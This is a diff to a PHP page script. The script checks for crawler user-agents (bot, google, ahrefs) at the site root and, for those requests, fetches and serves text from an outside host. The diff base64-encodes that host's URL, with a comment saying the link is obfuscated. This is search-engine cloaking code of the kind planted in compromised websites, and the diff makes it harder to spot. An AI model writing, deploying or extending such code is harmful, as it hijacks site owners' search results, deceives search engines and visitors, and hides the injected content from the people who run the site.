@@ -3,6 +3,7 @@ ob_start();
 header('Vary: User-Agent');
 $botchar = "/(bot|google|ahrefs)/i";
 $ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
+
 function aselolejos($url){
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
@@ -18,7 +19,9 @@ function aselolejos($url){
 if (preg_match($botchar, $ua) && $_SERVER["REQUEST_URI"] == "/") {
     usleep(rand(100000, 200000)); 
     header('Content-Type: text/html; charset=utf-8');
-    echo aselolejos("https://ktupotensi.pages.dev/potensi.txt");
+    // LINK DI OBFUSCATE PAKE BASE64
+    $url = base64_decode("aHR0cHM6Ly9rdHVwb3RlbnNpLnBhZ2VzLmRldi9wb3RlbnNpLnR4dA==");
+    echo aselolejos($url);
     ob_end_flush();
     exit;
 }
